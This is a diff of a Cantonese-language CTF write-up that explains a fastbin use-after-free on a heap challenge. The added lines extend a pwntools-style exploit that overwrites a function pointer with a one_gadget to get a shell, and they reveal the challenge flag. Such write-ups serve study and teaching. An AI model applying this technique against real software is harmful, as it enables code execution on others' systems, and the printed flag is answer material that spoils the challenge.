@@ -53,9 +53,9 @@ heap view :
 
 不過由於無edit function 所以我地唔可以用unlink->GOT Hijacking 
 
-普通fastbin attack 都唔得,因為add 會先malloc function pointer再malloc content
+普通fastbin attack 都唔得,因為add 會先malloc function pointer chunk再malloc content chunk
 
-由於我地控制唔到function pointer會去乜位所以就會crash 
+由於我地控制唔到function pointer chunk 會去乜位所以就會crash 
 
 不過點都好我地都要leak libc, heapbase (呢到無用)
 
@@ -93,7 +93,7 @@ Exploit :
 首先我地要malloc 一個Fastbin with content <0x20 嘅chunk 加兩個好大嘅chunk ,1個 padding (add(3,128,"X"))
 )
 
-係malloc 細chunk(add(0,30,"X"))嘅時候,由於function pointer 同content pointer 屬於0x20 bin ,就會拎返屬於以前table[0] table[1] function pointer 嘅address
+係malloc 細chunk(add(0,30,"X"))嘅時候,由於function pointer chunk同content pointer chunk屬於0x20 bin ,就會拎返屬於以前table[0] table[1] function pointer 嘅address
 
 ```python
 add(0,30,"X")
@@ -103,9 +103,9 @@ add(3,128,"X")
 ```
 再用呢個次序free左佢
  
-咁下一次malloc嘅function pointer位置會拎到上面細chunk content位置(fastbin LIFO features)
+咁下一次malloc嘅function pointer chunk 位置會拎到上面細chunk content位置(fastbin LIFO features)
 
-Content 會放左係之後,而且會覆蓋到以前嘅chunk(2 and 3)
+Content chunk 會放左係之後,而且會覆蓋到以前嘅chunk(2 and 3)
 
 ```python
 free(3)
@@ -113,17 +113,28 @@ free(2)
 free(1)
 free(0)
 ```
-再一個大chunk (size=900)我地會完整覆蓋到以前嘅chunk3
+再一個大chunk (size=900)我地會完整覆蓋到以前嘅chunk 3
  
-係chunk 3 function pointer 位置放one gadget
-再去menu spell->3 get shell
+係chunk 3 function pointer chunk 位置放one gadget
+利用use after free 走去menu spell->3 get shell
 
 ```python
 known_heap=heapbase+0x190
 rop=p64(pop_rax_ret)+p64(system)
-
 add(1,900,"Q"*(96+48)+p64(one_gadget))
+print "[+] Get Shell "
+r.sendline("3")
+r.recvuntil(":")
+r.sendline("3")
+r.sendline("ls -al")
 
+
+```
+
+Flag:
+
+```
+BAMBOOFOX{Hehehe...R3M3m6er_t0_s3T_Ni1_aFt3r_Fr3333333}
 ```
 
 
